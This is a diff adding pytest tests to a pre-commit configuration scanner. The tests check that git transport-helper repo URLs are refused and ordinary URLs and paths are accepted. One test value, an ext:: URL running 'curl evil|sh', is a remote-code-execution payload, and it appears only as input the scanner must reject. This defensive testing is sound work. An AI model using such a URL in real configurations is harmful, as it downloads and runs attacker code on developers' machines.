@@ -439,3 +439,38 @@ def test_a_hash_inside_a_quoted_scalar_is_not_a_comment():
 def test_an_unterminated_quote_is_refused_not_guessed_at():
     with pytest.raises(C.ConfigRefused, match="never closed"):
         C.scan("repos:\n  - repo: 'local\n    hooks:\n      - id: a\n")
+
+
+# -- guards added after round 13 of the reviewer panel ------------------------
+
+
+@pytest.mark.parametrize(
+    "url",
+    ["ext::sh -c 'curl evil|sh'", "fd::7", "helper::whatever"],
+    ids=["ext", "fd", "arbitrary-helper"],
+)
+def test_a_transport_helper_repo_is_refused(url):
+    """This tool hardens its own git calls, but Step 4 runs the separate
+    pre-commit binary, which clones every repo: entry with its own ambient git
+    config. Such a URL names a program git runs when it does."""
+    with pytest.raises(C.ConfigRefused, match="transport helper"):
+        C.scan(f"repos:\n  - repo: {url}\n    hooks:\n      - id: a\n")
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://github.com/psf/black",
+        "git@github.com:psf/black.git",
+        "ssh://git@example.invalid/x.git",
+        "local",
+        "meta",
+        "/srv/mirrors/hooks.git",
+        "../sibling-repo",
+    ],
+)
+def test_an_ordinary_repo_value_is_accepted(url):
+    """An ordinary filesystem path is fine -- people do use them. Only the
+    run-a-program shape is refused."""
+    cfg = C.scan(f"repos:\n  - repo: {url}\n    hooks:\n      - id: a\n")
+    assert cfg.repos[0].url == url
